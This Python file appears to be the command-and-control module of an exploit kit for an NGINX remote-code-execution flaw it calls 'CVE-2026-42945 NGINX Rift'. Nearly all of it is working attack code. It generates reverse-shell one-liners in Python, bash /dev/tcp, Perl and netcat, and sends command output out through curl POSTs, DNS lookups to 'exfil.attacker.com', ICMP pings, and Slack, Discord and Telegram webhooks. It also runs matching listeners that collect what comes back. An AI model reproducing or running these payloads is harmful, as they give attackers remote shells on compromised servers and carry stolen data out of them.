#!/usr/bin/env python3
"""
C2 Methods Registry & Implementation
CVE-2026-42945 NGINX Rift - Multi-Method Command & Control

Provides abstract base class and registry system for C2 callback methods.
Supports: TCP, HTTP, DNS, ICMP, WebSocket, Webhooks (Slack/Discord/Telegram)
"""

from abc import ABC, abstractmethod
from typing import Optional, Dict, List, Tuple
import threading
import socket
import time
import json
import subprocess
import struct
from datetime import datetime


class C2Method(ABC):
    """Abstract base class for all C2 callback methods"""
    
    name: str = "base"
    description: str = ""
    requires_public_ip: bool = False
    supports_interactive: bool = False
    priority: int = 50  # Lower = higher priority for fallback chain
    
    @abstractmethod
    def generate_payload(self, cmd: str, **kwargs) -> str:
        """Generate the shell payload to inject via RCE"""
        pass
    
    @abstractmethod
    def start_listener(self, **kwargs) -> bool:
        """Start the callback listener. Returns True if ready."""
        pass
    
    @abstractmethod
    def wait_output(self, timeout: float = 60.0) -> Optional[str]:
        """Block until output received or timeout. Returns output string or None."""
        pass
    
    def cleanup(self):
        """Clean up resources (called after use or on error)"""
        pass


class C2Registry:
    """Registry of all available C2 methods with discovery and instantiation"""
    
    _methods: Dict[str, type] = {}
    
    @classmethod
    def register(cls, method_class: type):
        """Decorator to register a C2 method class"""
        instance = method_class()
        cls._methods[instance.name] = method_class
        return method_class
    
    @classmethod
    def get(cls, name: str) -> Optional[type]:
        """Get a C2 method class by name"""
        return cls._methods.get(name)
    
    @classmethod
    def list_methods(cls) -> List[Dict]:
        """List all registered C2 methods with metadata"""
        methods = []
        for method_class in cls._methods.values():
            instance = method_class()
            methods.append({
                "name": instance.name,
                "desc": instance.description,
                "public_ip": instance.requires_public_ip,
                "interactive": instance.supports_interactive,
                "priority": instance.priority,
            })
        return sorted(methods, key=lambda m: m["priority"])
    
    @classmethod
    def get_by_priority(cls) -> List[type]:
        """Return all C2 methods sorted by priority (lowest first = highest priority)"""
        return sorted(cls._methods.values(), key=lambda m: m().priority)


# ─── TCP Reverse Shell (Enhanced) ──────────────────────────────────────

@C2Registry.register
class TCPReverseShell(C2Method):
    """Classic TCP reverse shell with multi-shell support"""
    
    name = "tcp"
    description = "TCP reverse shell (python3/bash/perl/nc)"
    requires_public_ip = True
    supports_interactive = True
    priority = 10
    
    def __init__(self):
        self.listener = None
        self.conn = None
        self.output = b""
    
    def generate_payload(self, cmd: str, lhost: str, lport: int, shell: str = "python3", **kw) -> str:
        """Generate reverse shell payload for target"""
        shells = {
            "python3": (
                f"python3 -c 'import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                f"s.connect((\"{lhost}\",{lport}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
            ),
            "python": (
                f"python -c 'import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                f"s.connect((\"{lhost}\",{lport}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
            ),
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "perl": (
                f"perl -e 'use Socket;"
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"connect(S,sockaddr_in({lport},inet_aton(\"{lhost}\")));"
                f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                f"exec(\"/bin/sh -i\")'"
            ),
            "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        }
        return shells.get(shell, shells["python3"])
    
    def start_listener(self, lhost: str = "0.0.0.0", lport: int = 1337, timeout: float = 300, **kw) -> bool:
        """Start TCP listener on lport"""
        try:
            # Kill any existing process on port (simplified - production should use better method)
            self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener.bind((lhost, lport))
            self.listener.listen(1)
            self.listener.settimeout(timeout)
            return True
        except OSError as e:
            return False
    
    def wait_output(self, timeout: float = 60.0) -> Optional[str]:
        """Accept incoming connection and collect shell output"""
        try:
            self.conn, addr = self.listener.accept()
            self.conn.settimeout(timeout)
            
            while True:
                try:
                    data = self.conn.recv(4096)
                    if not data:
                        break
                    self.output += data
                except socket.timeout:
                    break
            
            return self.output.decode("latin-1", errors="replace")
        except (OSError, socket.timeout):
            return None
    
    def cleanup(self):
        """Close sockets"""
        if self.conn:
            try:
                self.conn.close()
            except OSError:
                pass
        if self.listener:
            try:
                self.listener.close()
            except OSError:
                pass


# ─── HTTP Callback ────────────────────────────────────────────────────

@C2Registry.register
class HTTPCallback(C2Method):
    """HTTP callback for output exfiltration (one-shot)"""
    
    name = "http"
    description = "HTTP POST callback for output exfiltration"
    requires_public_ip = True
    supports_interactive = False
    priority = 15
    
    def __init__(self):
        self.output = None
        self.event = threading.Event()
        self.listener_thread = None
    
    def generate_payload(self, cmd: str, callback_ip: str, callback_port: int, **kw) -> str:
        """Generate command that POSTs output to callback URL"""
        return f"{cmd} | curl -sm5 -d @- http://{callback_ip}:{callback_port}/rce"
    
    def start_listener(self, callback_port: int = 9876, **kw) -> bool:
        """Start HTTP listener for callbacks"""
        from http.server import HTTPServer, BaseHTTPRequestHandler
        
        class CallbackHandler(BaseHTTPRequestHandler):
            c2 = self
            
            def do_POST(self):
                if "/rce" not in self.path:
                    self.send_response(404)
                    self.end_headers()
                    return
                
                n = int(self.headers.get("Content-Length", "0"))
                body = self.rfile.read(n).decode("latin-1", errors="replace") if n else ""
                
                self.c2.output = body
                self.c2.event.set()
                
                self.send_response(200)
                self.end_headers()
            
            def do_GET(self):
                self.send_response(200)
                self.end_headers()
            
            def log_message(self, format, *args):
                pass  # Suppress logging
        
        try:
            server = HTTPServer(("0.0.0.0", callback_port), CallbackHandler)
            server.timeout = 1
            
            def run_server():
                while not self.event.is_set():
                    server.handle_request()
                server.server_close()
            
            self.listener_thread = threading.Thread(target=run_server, daemon=True)
            self.listener_thread.start()
            return True
        except OSError:
            return False
    
    def wait_output(self, timeout: float = 60.0) -> Optional[str]:
        """Wait for HTTP callback"""
        if self.event.wait(timeout):
            return self.output
        return None


# ─── DNS Exfiltration (NEW) ───────────────────────────────────────────

@C2Registry.register
class DNSExfiltration(C2Method):
    """Exfiltrate output via DNS queries (stealthy, rarely blocked)"""
    
    name = "dns"
    description = "DNS-based exfiltration (base64 encoded in subdomains)"
    requires_public_ip = False
    supports_interactive = False
    priority = 30
    
    def __init__(self):
        self.captured = []
        self.running = False
        self.listener_thread = None
    
    def generate_payload(self, cmd: str, dns_server: str, domain: str = "exfil.attacker.com", **kw) -> str:
        """Generate payload that encodes output in DNS queries"""
        return (
            f"OUT=$({cmd}); "
            f"echo -n \"$OUT\" | base64 | tr -d '\\n' | "
            f"while read -n 60 chunk; do "
            f"  [ -n \"$chunk\" ] && nslookup $chunk.{domain} {dns_server} 2>&1 > /dev/null; "
            f"done"
        )
    
    def start_listener(self, dns_server: str = "0.0.0.0", dns_port: int = 53, domain: str = "exfil.attacker.com", **kw) -> bool:
        """Start DNS listener to capture exfiltrated data"""
        self.domain = domain
        self.running = True
        
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.bind((dns_server, dns_port))
            
            self.listener_thread = threading.Thread(target=self._listen, daemon=True)
            self.listener_thread.start()
            return True
        except OSError:
            return False
    
    def _listen(self):
        """Listen for DNS queries and extract data from subdomains"""
        while self.running:
            try:
                self.sock.settimeout(1)
                data, addr = self.sock.recvfrom(512)
                
                # Simple DNS parsing: extract query name
                if len(data) > 12:
                    try:
                        qname_start = 12
                        qname_end = data.index(b'\x00', qname_start)
                        qname_raw = data[qname_start:qname_end]
                        
                        # Decode DNS name format
                        labels = []
                        i = 0
                        while i < len(qname_raw):
                            length = qname_raw[i]
                            i += 1
                            if length == 0:
                                break
                            labels.append(qname_raw[i:i+length].decode('latin-1', errors='ignore'))
                            i += length
                        
                        if labels:
                            encoded = labels[0]
                            self.captured.append(encoded)
                    except (ValueError, IndexError):
                        pass
            except (socket.timeout, OSError):
                continue
    
    def wait_output(self, timeout: float = 60.0) -> Optional[str]:
        """Wait for DNS queries and return decoded output"""
        time.sleep(timeout)
        self.running = False
        
        import base64
        raw = ''.join(self.captured)
        if raw:
            try:
                # Add padding if needed
                missing_padding = len(raw) % 4
                if missing_padding:
                    raw += '=' * (4 - missing_padding)
                return base64.b64decode(raw).decode('latin-1', errors='replace')
            except:
                return raw
        return None


# ─── ICMP Tunnel (NEW) ────────────────────────────────────────────────

@C2Registry.register
class ICMPTunnel(C2Method):
    """Exfiltrate output via ICMP echo (ping) payloads"""
    
    name = "icmp"
    description = "ICMP-based exfiltration (ping tunneling)"
    requires_public_ip = True
    supports_interactive = False
    priority = 35
    
    def __init__(self):
        self.captured = []
        self.running = False
        self.listener_thread = None
    
    def generate_payload(self, cmd: str, lhost: str, **kw) -> str:
        """Generate payload that encodes output in ICMP pings"""
        return (
            f"OUT=$({cmd}); "
            f"echo -n \"$OUT\" | xxd -p | tr -d '\\n' | "
            f"while read -n 32 hex; do "
            f"  [ -n \"$hex\" ] && ping -c 1 -p \"$hex\" {lhost} 2>&1 > /dev/null; "
            f"done"
        )
    
    def start_listener(self, lhost: str = "0.0.0.0", **kw) -> bool:
        """Start ICMP listener (requires raw socket / root)"""
        self.running = True
        
        try:
            # Raw ICMP socket
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            self.sock.bind((lhost, 0))
            
            self.listener_thread = threading.Thread(target=self._sniff, daemon=True)
            self.listener_thread.start()
            return True
        except (OSError, PermissionError):
            # Requires root/admin
            return False
    
    def _sniff(self):
        """Sniff ICMP packets and extract data from payload"""
        while self.running:
            try:
                self.sock.settimeout(1)
                data, addr = self.sock.recvfrom(65535)
                
                # IP header is 20 bytes, ICMP header is 8 bytes
                # Data starts at offset 28
                if len(data) > 28:
                    icmp_payload = data[28:]
                    self.captured.append(icmp_payload)
            except (socket.timeout, OSError):
                continue
    
    def wait_output(self, timeout: float = 60.0) -> Optional[str]:
        """Wait for ICMP packets and return decoded output"""
        time.sleep(timeout)
        self.running = False
        
        raw = b''.join(self.captured)
        if raw:
            try:
                # Convert hex bytes back to ASCII
                return bytes.fromhex(raw.hex()).decode('latin-1', errors='replace')
            except:
                return raw.decode('latin-1', errors='replace')
        return None


# ─── WebSocket Callback (NEW) ────────────────────────────────────────

@C2Registry.register
class WebSocketCallback(C2Method):
    """WebSocket callback for bidirectional communication"""
    
    name = "ws"
    description = "WebSocket callback (works through many firewalls)"
    requires_public_ip = True
    supports_interactive = True
    priority = 20
    
    def __init__(self):
        self.output = None
        self.event = threading.Event()
        self.listener_thread = None
    
    def generate_payload(self, cmd: str, ws_url: str, **kw) -> str:
        """Generate payload for WebSocket callback"""
        host = ws_url.split('://')[1].split(':')[0]
        return (
            f"python3 -c 'import socket,json,subprocess; "
            f"s=socket.socket();s.connect((\"{host}\",8765)); "
            f"r=subprocess.check_output(\"{cmd}\",shell=True); "
            f"s.send(json.dumps({{\"type\":\"output\",\"data\":r.decode()}}).encode()); "
            f"s.close()'"
        )
    
    def start_listener(self, ws_host: str = "0.0.0.0", ws_port: int = 8765, **kw) -> bool:
        """Start simple WebSocket server"""
        self.running = True
        
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((ws_host, ws_port))
            self.sock.listen(1)
            
            self.listener_thread = threading.Thread(target=self._listen, daemon=True)
            self.listener_thread.start()
            return True
        except OSError:
            return False
    
    def _listen(self):
        """Accept WebSocket connections and receive data"""
        while self.running:
            try:
                self.sock.settimeout(1)
                conn, addr = self.sock.accept()
                conn.settimeout(5)
                
                # Simple WS handshake (not full RFC 6455, just for demo)
                request = conn.recv(1024)
                response = b"HTTP/1.1 101 Switching Protocols\r\n\r\n"
                conn.sendall(response)
                
                # Receive data
                data = conn.recv(4096)
                if data:
                    try:
                        msg = json.loads(data.decode())
                        if msg.get("type") == "output":
                            self.output = msg.get("data")
                            self.event.set()
                    except:
                        pass
                
                conn.close()
            except (socket.timeout, OSError):
                continue
    
    def wait_output(self, timeout: float = 60.0) -> Optional[str]:
        """Wait for WebSocket data"""
        if self.event.wait(timeout):
            return self.output
        return None
    
    def cleanup(self):
        """Clean up socket"""
        self.running = False
        if hasattr(self, 'sock'):
            try:
                self.sock.close()
            except OSError:
                pass


# ─── Webhook Integrations (NEW) ───────────────────────────────────────

@C2Registry.register
class SlackWebhook(C2Method):
    """Exfiltrate via Slack incoming webhook"""
    
    name = "slack"
    description = "Slack webhook exfiltration"
    requires_public_ip = False
    supports_interactive = False
    priority = 40
    
    def generate_payload(self, cmd: str, webhook_url: str, **kw) -> str:
        """Generate payload for Slack webhook"""
        # Escape special characters for JSON
        return (
            f"curl -s -X POST '{webhook_url}' "
            f"-H 'Content-Type: application/json' "
            f"-d '{{\"text\":\"RCE Output:\\n```$({cmd})```\"}}'"
        )
    
    def start_listener(self, **kw) -> bool:
        """No listener needed for Slack"""
        return True
    
    def wait_output(self, timeout: float = 60.0) -> Optional[str]:
        """Return info message"""
        return "(Output sent to Slack webhook - check channel)"


@C2Registry.register
class DiscordWebhook(C2Method):
    """Exfiltrate via Discord webhook"""
    
    name = "discord"
    description = "Discord webhook exfiltration"
    requires_public_ip = False
    supports_interactive = False
    priority = 41
    
    def generate_payload(self, cmd: str, webhook_url: str, **kw) -> str:
        """Generate payload for Discord webhook"""
        return (
            f"curl -s -X POST '{webhook_url}' "
            f"-H 'Content-Type: application/json' "
            f"-d '{{\"content\":\"```$({cmd})```\"}}'"
        )
    
    def start_listener(self, **kw) -> bool:
        return True
    
    def wait_output(self, timeout: float = 60.0) -> Optional[str]:
        return "(Output sent to Discord webhook - check channel)"


@C2Registry.register
class TelegramBot(C2Method):
    """Exfiltrate via Telegram Bot API"""
    
    name = "telegram"
    description = "Telegram Bot API exfiltration"
    requires_public_ip = False
    supports_interactive = False
    priority = 42
    
    def generate_payload(self, cmd: str, bot_token: str, chat_id: str, **kw) -> str:
        """Generate payload for Telegram"""
        return (
            f"curl -s 'https://api.telegram.org/bot{bot_token}/sendMessage' "
            f"-d 'chat_id={chat_id}' -d 'text=$({cmd})'"
        )
    
    def start_listener(self, **kw) -> bool:
        return True
    
    def wait_output(self, timeout: float = 60.0) -> Optional[str]:
        return "(Output sent to Telegram bot - check chat)"


# ─── GSocket Relay (Existing - Wrapped) ────────────────────────────────

@C2Registry.register
class GSocketRelay(C2Method):
    """GSocket/GSRN relay for NAT traversal"""
    
    name = "gsocket"
    description = "GSocket relay for NAT traversal (no public IP needed)"
    requires_public_ip = False
    supports_interactive = True
    priority = 25
    
    def generate_payload(self, cmd: str, gs_secret: str, relay_host: str = "gs.gsocket.io", relay_port: int = 7350, **kw) -> str:
        """Generate payload using gs-netcat"""
        extra = f" -r {relay_host} -p {relay_port}" if relay_host != "gs.gsocket.io" else ""
        return f"{cmd} | gs-netcat -q -s {gs_secret}{extra}"
    
    def start_listener(self, **kw) -> bool:
        """GSocket listener would be started externally"""
        return True
    
    def wait_output(self, timeout: float = 60.0) -> Optional[str]:
        """Output via GSocket would be received externally"""
        return None


# ─── L2 Multi-hop Relay (Existing - Wrapped) ──────────────────────────

@C2Registry.register
class L2RelayMultiHop(C2Method):
    """Multi-hop L2 relay using bash/python/perl chain"""
    
    name = "l2relay"
    description = "L2 multi-hop relay (bash/python/perl fallback chain)"
    requires_public_ip = True
    supports_interactive = True
    priority = 45
    
    def generate_payload(self, cmd: str, l2_ip: str, l2_port: int, **kw) -> str:
        """Generate L2 multi-hop payload"""
        bash = f"bash -i >& /dev/tcp/{l2_ip}/{l2_port} 0>&1"
        py3 = (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{l2_ip}\",{l2_port}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        )
        py2 = py3.replace("python3", "python")
        perl = (
            f"perl -e 'use Socket;"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"connect(S,sockaddr_in({l2_port},inet_aton(\"{l2_ip}\")));"
            f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            f"exec(\"/bin/sh -i\");'"
        )
        
        return (
            f"bash -c '{bash}' 2>/dev/null || "
            f"{py3} 2>/dev/null || "
            f"{py2} 2>/dev/null || "
            f"{perl}"
        )
    
    def start_listener(self, **kw) -> bool:
        """L2 relay listener would be on remote machine"""
        return True
    
    def wait_output(self, timeout: float = 60.0) -> Optional[str]:
        return "(L2 relay output via remote machine)"


if __name__ == "__main__":
    # Test registry
    print("Available C2 Methods:")
    for method in C2Registry.list_methods():
        print(f"  {method['name']:15} - {method['desc']}")
